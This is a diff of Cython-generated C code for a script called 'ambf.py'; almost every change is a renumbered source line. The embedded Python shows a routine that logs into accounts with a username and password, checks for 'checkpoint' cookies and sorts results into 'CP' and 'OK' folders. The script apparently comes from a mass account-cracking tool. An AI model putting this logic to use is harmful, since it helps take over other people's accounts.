-    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 662, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 655, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
       __pyx_t_4 = __pyx_t_2; __Pyx_INCREF(__pyx_t_4); __pyx_t_8 = 0;
       __pyx_t_9 = NULL;
     } else {
-      __pyx_t_8 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 662, __pyx_L1_error)
+      __pyx_t_8 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_4);
-      __pyx_t_9 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 662, __pyx_L1_error)
+      __pyx_t_9 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 655, __pyx_L1_error)
     }
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
     for (;;) {
@@ -20566,17 +20325,17 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
         if (likely(PyList_CheckExact(__pyx_t_4))) {
           if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_4)) break;
           #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-          __pyx_t_2 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 662, __pyx_L1_error)
+          __pyx_t_2 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 655, __pyx_L1_error)
           #else
-          __pyx_t_2 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 662, __pyx_L1_error)
+          __pyx_t_2 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 655, __pyx_L1_error)
           __Pyx_GOTREF(__pyx_t_2);
           #endif
         } else {
           if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
           #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-          __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 662, __pyx_L1_error)
+          __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_2); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 655, __pyx_L1_error)
           #else
-          __pyx_t_2 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 662, __pyx_L1_error)
+          __pyx_t_2 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 655, __pyx_L1_error)
           __Pyx_GOTREF(__pyx_t_2);
           #endif
         }
@@ -20586,7 +20345,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
           PyObject* exc_type = PyErr_Occurred();
           if (exc_type) {
             if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-            else __PYX_ERR(0, 662, __pyx_L1_error)
+            else __PYX_ERR(0, 655, __pyx_L1_error)
           }
           break;
         }
@@ -20595,34 +20354,34 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_XDECREF_SET(__pyx_v_opt, __pyx_t_2);
       __pyx_t_2 = 0;
 
-      /* "ambf.py":663
+      /* "ambf.py":656
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")
  * 		for opt in range(len(ngew)):
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])             # <<<<<<<<<<<<<<
  * 	elif "login_error" in str(run):
  * 		oh = run.find("div",{"id":"login_error"}).find("div").text
  */
-      __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_v_opt, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_v_opt, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_2);
-      __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-      __pyx_t_2 = PyNumber_Add(__pyx_kp_s__59, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_2 = PyNumber_Add(__pyx_kp_s__59, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-      __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__60); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_5 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__60); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-      __pyx_t_2 = __Pyx_PyObject_GetItem(__pyx_v_ngew, __pyx_v_opt); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyObject_GetItem(__pyx_v_ngew, __pyx_v_opt); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_2);
-      __pyx_t_3 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 663, __pyx_L1_error)
+      __pyx_t_3 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_3);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
       __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-      if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 663, __pyx_L1_error)
+      if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 656, __pyx_L1_error)
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-      /* "ambf.py":662
+      /* "ambf.py":655
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")
  * 		for opt in range(len(ngew)):             # <<<<<<<<<<<<<<
@@ -20632,7 +20391,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":653
+    /* "ambf.py":646
  * 	if "c_user" in ses.cookies:
  * 		print(" [!] akun tidak checkpoint")
  * 	elif "checkpoint" in ses.cookies:             # <<<<<<<<<<<<<<
@@ -20642,32 +20401,32 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     goto __pyx_L6;
   }
 
-  /* "ambf.py":664
+  /* "ambf.py":657
  * 		for opt in range(len(ngew)):
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])
  * 	elif "login_error" in str(run):             # <<<<<<<<<<<<<<
  * 		oh = run.find("div",{"id":"login_error"}).find("div").text
  * 		print(" [!] %s"%(oh))
  */
-  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_run); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_run); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_login_error, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 664, __pyx_L1_error)
+  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_login_error, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 657, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __pyx_t_10 = (__pyx_t_11 != 0);
   if (__pyx_t_10) {
 
-    /* "ambf.py":665
+    /* "ambf.py":658
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])
  * 	elif "login_error" in str(run):
  * 		oh = run.find("div",{"id":"login_error"}).find("div").text             # <<<<<<<<<<<<<<
  * 		print(" [!] %s"%(oh))
  * 	else:
  */
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_run, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 665, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_run, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 658, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
-    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_id, __pyx_n_s_login_error) < 0) __PYX_ERR(0, 665, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_id, __pyx_n_s_login_error) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
     __pyx_t_1 = NULL;
     __pyx_t_7 = 0;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -20683,7 +20442,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCALL
     if (PyFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_n_s_div, __pyx_t_5};
-      __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
+      __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 658, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
       __Pyx_GOTREF(__pyx_t_3);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
@@ -20692,14 +20451,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCCALL
     if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_n_s_div, __pyx_t_5};
-      __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
+      __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 658, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
       __Pyx_GOTREF(__pyx_t_3);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
     } else
     #endif
     {
-      __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 665, __pyx_L1_error)
+      __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 658, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_6);
       if (__pyx_t_1) {
         __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_1); __pyx_t_1 = NULL;
@@ -20710,12 +20469,12 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_GIVEREF(__pyx_t_5);
       PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_7, __pyx_t_5);
       __pyx_t_5 = 0;
-      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
+      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 658, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_3);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
     }
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 665, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -20730,28 +20489,28 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_n_s_div) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_s_div);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 658, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 665, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_v_oh = __pyx_t_2;
     __pyx_t_2 = 0;
 
-    /* "ambf.py":666
+    /* "ambf.py":659
  * 	elif "login_error" in str(run):
  * 		oh = run.find("div",{"id":"login_error"}).find("div").text
  * 		print(" [!] %s"%(oh))             # <<<<<<<<<<<<<<
  * 	else:
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
  */
-    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_s_2, __pyx_v_oh); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 666, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_s_2, __pyx_v_oh); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 659, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 666, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 659, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-    /* "ambf.py":664
+    /* "ambf.py":657
  * 		for opt in range(len(ngew)):
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])
  * 	elif "login_error" in str(run):             # <<<<<<<<<<<<<<
@@ -20761,7 +20520,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     goto __pyx_L6;
   }
 
-  /* "ambf.py":668
+  /* "ambf.py":661
  * 		print(" [!] %s"%(oh))
  * 	else:
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")             # <<<<<<<<<<<<<<
@@ -20769,11 +20528,11 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
  * def make():
  */
   /*else*/ {
-    if (__Pyx_PrintOne(0, __pyx_kp_s_login_gagal_silahkan_cek_kembal) < 0) __PYX_ERR(0, 668, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_kp_s_login_gagal_silahkan_cek_kembal) < 0) __PYX_ERR(0, 661, __pyx_L1_error)
   }
   __pyx_L6:;
 
-  /* "ambf.py":634
+  /* "ambf.py":627
  * 	menu()
  * 
  * def check_in(user, pasw):             # <<<<<<<<<<<<<<
@@ -20818,7 +20577,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   return __pyx_r;
 }
 
-/* "ambf.py":670
+/* "ambf.py":663
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
  * 
  * def make():             # <<<<<<<<<<<<<<
@@ -20854,16 +20613,16 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("make", 0);
 
-  /* "ambf.py":671
+  /* "ambf.py":664
  * 
  * def make():
  * 	os.system("git pull")             # <<<<<<<<<<<<<<
  * 	os.system("touch login.txt")
  * 	try:os.mkdir("CP")
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 671, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 671, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 664, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_t_2 = NULL;
@@ -20878,21 +20637,21 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_kp_s_git_pull) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_git_pull);
   __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 664, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":672
+  /* "ambf.py":665
  * def make():
  * 	os.system("git pull")
  * 	os.system("touch login.txt")             # <<<<<<<<<<<<<<
  * 	try:os.mkdir("CP")
  * 	except:pass
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 672, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
-  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 672, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 665, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_t_3 = NULL;
@@ -20907,12 +20666,12 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_kp_s_touch_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_s_touch_login_txt);
   __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 672, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 665, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":673
+  /* "ambf.py":666
  * 	os.system("git pull")
  * 	os.system("touch login.txt")
  * 	try:os.mkdir("CP")             # <<<<<<<<<<<<<<
@@ -20927,9 +20686,9 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XGOTREF(__pyx_t_5);
     __Pyx_XGOTREF(__pyx_t_6);
     /*try:*/ {
-      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 673, __pyx_L3_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 666, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_2);
-      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 673, __pyx_L3_error)
+      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 666, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_3);
       __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
       __pyx_t_2 = NULL;
@@ -20944,7 +20703,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_CP) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_CP);
       __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 673, __pyx_L3_error)
+      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 666, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
@@ -20958,7 +20717,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":674
+    /* "ambf.py":667
  * 	os.system("touch login.txt")
  * 	try:os.mkdir("CP")
  * 	except:pass             # <<<<<<<<<<<<<<
@@ -20977,7 +20736,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_L8_try_end:;
   }
 
-  /* "ambf.py":675
+  /* "ambf.py":668
  * 	try:os.mkdir("CP")
  * 	except:pass
  * 	try:os.mkdir("OK")             # <<<<<<<<<<<<<<
@@ -20992,9 +20751,9 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XGOTREF(__pyx_t_5);
     __Pyx_XGOTREF(__pyx_t_4);
     /*try:*/ {
-      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 675, __pyx_L9_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 668, __pyx_L9_error)
       __Pyx_GOTREF(__pyx_t_3);
-      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 675, __pyx_L9_error)
+      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 668, __pyx_L9_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
       __pyx_t_3 = NULL;
@@ -21009,7 +20768,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_n_s_OK) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_s_OK);
       __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L9_error)
+      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 668, __pyx_L9_error)
       __Pyx_GOTREF(__pyx_t_1);
       __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
@@ -21023,7 +20782,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":676
+    /* "ambf.py":669
  * 	except:pass
  * 	try:os.mkdir("OK")
  * 	except:pass             # <<<<<<<<<<<<<<
@@ -21042,14 +20801,14 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_L14_try_end:;
   }
 
-  /* "ambf.py":677
+  /* "ambf.py":670
  * 	try:os.mkdir("OK")
  * 	except:pass
  * 	login()             # <<<<<<<<<<<<<<
  * 
  * def cek_apikey():
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_login); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 677, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_login); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 670, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __pyx_t_3 = NULL;
   if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
@@ -21063,12 +20822,12 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
